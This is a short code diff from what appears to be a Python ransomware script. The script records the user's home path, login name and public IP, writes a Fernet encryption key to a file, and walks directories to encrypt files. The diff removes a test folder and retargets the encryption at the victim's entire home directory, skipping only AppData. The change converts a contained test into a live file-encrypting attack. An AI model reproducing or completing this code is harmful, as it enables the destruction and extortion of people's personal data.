@@ -20,7 +20,6 @@ else:
 
 #USER INFO
 home_path =  os.path.expanduser('~')
-test_path = 'C:/Users/USUARIO/test_path/'
 current_user = os.getlogin()
 public_ip = requests.get('https://api.ipify.org').text
 
@@ -47,7 +46,7 @@ def encrypt_path():
     with open("KEY", "wb") as file_key :#create binary key to encrypt (and decrypt)
                     file_key.write(key)
                     loaded_key = Fernet(key)
-    for root, dirs, files in os.walk(test_path):
+    for root, dirs, files in os.walk(home_path):
         
         if 'AppData' in dirs:
             dirs.remove('AppData') 
